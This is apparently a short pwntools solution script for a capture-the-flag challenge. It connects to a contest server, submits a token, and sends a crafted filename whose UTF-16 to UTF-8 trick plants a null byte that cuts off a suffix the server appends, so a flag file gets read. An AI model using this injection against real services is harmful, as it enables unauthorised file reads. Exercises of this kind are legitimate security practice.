from pwn import *

io = remote('202.38.93.141', 14202)
io.recvuntil(b'Please input your token: \n')
io.sendline(b'1411:MEQCIAplFMrlOcSGiuyvXbD2viXkZel+YtLmOBzUXj48+rzXAiBrX2C/xRLIxhAn+TJYUsQtGEDzpleulEFWzyijebwTXA==')

io.recvuntil(b"Enter filename. I'll append 'you_cant_get_the_flag' to it:\r\n")
payload = b'Z:\\theflag\x00"'

s = payload.decode('utf-16')
print(s)
u8 = s.encode('utf-8')
print(u8)
print(s.encode('utf-16')[2:])
io.sendline(u8)

print(io.recvall())